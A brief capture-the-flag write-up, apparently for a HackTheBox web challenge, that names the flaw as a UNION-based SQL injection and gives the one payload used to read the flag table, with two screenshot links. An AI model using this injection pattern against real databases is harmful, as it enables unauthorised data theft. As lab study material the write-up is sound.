---
title: Unholy Union
tags:
  - CTF
  - HackTheBox
  - Web
---
![](Pasted%20image%2020241023152808.png)

It's a basic UNION SQLi
Payload: `a' UNION SELECT NULL, NULL, NULL, NULL, (SELECT GROUP_CONCAT(flag) FROM flag) -- -`

![](Pasted%20image%2020241023153046.png)